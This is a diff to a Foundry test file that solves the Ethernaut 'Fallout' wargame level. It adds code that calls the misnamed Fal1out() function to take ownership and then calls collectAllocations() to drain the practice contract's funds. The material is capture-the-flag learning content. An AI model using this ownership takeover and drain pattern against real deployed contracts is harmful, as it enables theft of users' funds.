@@ -41,6 +41,7 @@ contract FalloutTest is Test {
 
         address levelAddress = ethernaut.createLevelInstance(falloutFactory);
         Fallout falloutContract = Fallout(payable(levelAddress));
+        vm.deal(address(falloutContract), 1 ether);
 
         emit log_named_address(
             "The original owner of the contract: ",
@@ -61,9 +62,24 @@ contract FalloutTest is Test {
                                 LEVEL EXPLOIT
         //////////////////////////////////////////////////////////////*/
 
-        /**
-         * CODE GOES HERE
-         */
+        // claiming ownership by eve
+        emit log_string("Calling Fal1out() function... 🧨 ");
+        falloutContract.Fal1out();
+
+        emit log_named_address(
+            "New owner of the contract: ",
+            falloutContract.owner()
+        );
+
+        // draining the contract
+        emit log_string("Calling collectAllocations() function ... 👸");
+        falloutContract.collectAllocations();
+        emit log_named_uint(
+            "Balance of the contract (after): ",
+            address(falloutContract).balance
+        );
+
+        emit log_named_uint("Balance of Eve (after): ", eve.balance);
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL SUBMISSION
